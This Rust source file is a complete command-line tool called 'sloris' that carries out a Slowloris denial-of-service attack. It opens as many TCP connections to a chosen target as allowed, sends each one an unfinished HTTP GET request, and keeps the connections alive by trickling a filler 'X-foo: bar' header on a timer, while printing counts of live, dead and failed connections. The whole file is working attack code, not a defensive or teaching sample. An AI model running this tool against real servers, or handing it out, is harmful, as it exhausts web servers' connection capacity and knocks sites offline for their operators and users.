use std::{env, writeln};
use env::Args;
use std::net::{TcpStream, SocketAddr, Shutdown};
use std::io::{Error, Write, stderr};
use std::result::Result;
use std::time::{Duration, SystemTime};
use std::panic;
use std::collections::VecDeque;


#[derive(Debug)]
enum MaxConnections {
    Infinite,
    Max(u32)
}

#[derive(Debug)]
struct Arguments {
    target: String,
    port: u16,
    timeout: Duration,
    max_connections: MaxConnections
}

struct Socket {
    last_update: SystemTime,
    stream: TcpStream
}

struct Stats <'a> {
    connections: u32,
    failed: u32,
    dead: u32,
    options: &'a Arguments,
    death_times: VecDeque::<Duration>
}

fn main() {

    panic::set_hook(Box::new(panic_hook));

    let options: Arguments = parse_arguments(env::args());

    let mut stats = Stats {
        connections: 0,
        failed: 0,
        dead: 0,
        options: &options,
        death_times: VecDeque::new()
    };

    let mut sockets = Vec::<Socket>::new();


    //Make temporary room for the stats data
    for _ in 0..6 {
        print!("-\n");
    }

    //Connection and update loop
    loop {

        //Update sockets
        let mut to_remove = vec![];
        for index in 0..sockets.len() {
            let socket = &mut sockets[index];
            
            let mut alive = true;
            
            if socket.last_update.elapsed().unwrap() > options.timeout {
                if !update_connection(&mut socket.stream) {
                    alive = false;
                } else {
                    socket.last_update = SystemTime::now();
                }
            } else {
                //Detect dead connections
                alive = check_alive(&mut socket.stream);
            }

            if !alive {
                to_remove.push(index);
                socket.stream.shutdown(Shutdown::Both).unwrap_or(());
                stats.connections -= 1;
                stats.dead += 1;
                stats.death_times.push_front(socket.last_update.elapsed().unwrap());
                if stats.death_times.len() > 5 {stats.death_times.pop_back();}
            }

        }

        for index in to_remove {
            sockets.remove(index);
        }

        let connect_more = match options.max_connections {
            MaxConnections::Infinite => true,
            MaxConnections::Max(n) => n > sockets.len() as u32
        };

        if connect_more {
            if let Ok(stream) = connect(&options.target, options.port){
                sockets.push(Socket {
                    last_update: SystemTime::now(),
                    stream: stream
                });
                stats.connections += 1;
            } else {
                stats.failed += 1;
            }
        }

        //std::thread::sleep(Duration::new(1, 0));
        draw(&stats);
    }

}

fn connect(target: &String, port: u16) -> Result<TcpStream, Error> {
    let address: SocketAddr = format!("{}:{}",target, port).parse().expect(format!("Invalid hostname {}", target).as_str());
    let stream = TcpStream::connect_timeout(&address, Duration::new(2, 0));
    if let Ok(mut stream) = stream {
        stream.write(b"GET / HTTP/1.1\r\n").unwrap();
        return Ok(stream)
    }
    stream
}

//Attempts to check if a socket is still breathing
fn check_alive(stream: &mut TcpStream) -> bool {
    let result = stream.write(b"");
    match result {
        Ok(_) => true,
        Err(_) => false
    }
}

fn update_connection(stream: &mut TcpStream) -> bool {
    let bytes_send = stream.write(b"X-foo: bar\r\n");
    if let Ok(n) = bytes_send {
        if n == "X-foo: bar\r\n".len() {return true}
    }
    false
}

fn draw(stats: &Stats) {

    print!("\x1b[s");

    for _ in 0..6 {
        print!("\x1b[1A\x1b[K");
    }
    print!("\r");

    print!("Target: {}:{}\nConnections: {}\nDead: {}\nFailed: {}\nTimeout: {}\nAverage lifetime: {}s\n",
        stats.options.target,
        stats.options.port,
        stats.connections,
        stats.dead,
        stats.failed,
        stats.options.timeout.as_secs(),
        if stats.death_times.len() > 0 {
            stats.death_times.iter().map(|dur| dur.as_secs()).sum::<u64>() / stats.death_times.len() as u64
        } else {0}
    );
}

fn parse_arguments(mut arguments: Args) -> Arguments{
    
    let mut arg_struct = Arguments {
        target: "".to_owned(),
        port: 80,
        timeout: Duration::new(30,0),
        max_connections: MaxConnections::Infinite
    };
    
    //Skip over the filename
    arguments.next();

    loop {
        #[allow(unused_assignments)]
        let mut option: Option<&str> = None;
        let value: String;

        let arg: String;

        match arguments.next() {
            Some(argument) => {
                arg = argument;
                if arg.starts_with("--") {

                    if arg == "--help" {
                        show_help();
                        std::process::exit(0);
                    }

                    option = Some(arg.strip_prefix("--").unwrap());
                    value = arguments.next().expect(format!("Missing value for opton {}", option.as_ref().unwrap()).as_str());
                } else if arg.starts_with("-") {
                    let flag = arg.strip_prefix("-").unwrap();
                    match flag {
                        "h" => option = Some("target"),
                        "p" => option = Some("port"),
                        "t" => option = Some("timeout"),
                        "m" => option = Some("max"),
                        _ => panic!(format!("Unknown option {}", flag))
                    }
                    value = arguments.next().expect(format!("Missing value for opton {}", option.as_ref().unwrap()).as_str());
                } else {
                    option = None;
                    value = arg;
                }
            },
            None => break
        }
        let option = option;

        match option {
            Some(option) => {
                match option {
                    "target" => arg_struct.target = value,
                    "host" => arg_struct.target = value,
                    "port" => arg_struct.port = value.parse::<u16>().expect("Failed to parse port"),
                    "timeout" => arg_struct.timeout = Duration::new(value.parse::<u64>().unwrap(), 0),
                    "max" => arg_struct.max_connections = if value == "ininite" { MaxConnections::Infinite} else { MaxConnections::Max(value.parse::<u32>().unwrap())},
                    _ => {
                        panic!(format!("Unknown option {}", option));
                    }
                }
            },
            None => {
                if arg_struct.target == "" {
                    arg_struct.target = value;
                } else {
                    panic!(format!("Unexpected nameless argument {}", value))
                }
            }
        }

    }

    if arg_struct.target == "" {
        show_usage();
        std::process::exit(1);
    }

    arg_struct

}

fn show_usage() {
    println!("Usage: sloris [--port PORT] [--timeout TIMEOUT] [--max MAX] TARGET");
}

fn show_help() {
    println!("HELP")
}

//Just a nicer panic
//See the default one here https://doc.rust-lang.org/src/std/panicking.rs.html#180
fn panic_hook(info: &panic::PanicInfo<'_>) {
    let location = info.location().unwrap();
    let msg = match info.payload().downcast_ref::<&'static str>() {
        Some(s) => *s,
        None => match info.payload().downcast_ref::<String>() {
            Some(s) => &s[..],
            None => "Box<Any>",
        },
    };

    let _ = writeln!(stderr(), "Error: {} at {}",  msg, location);
}
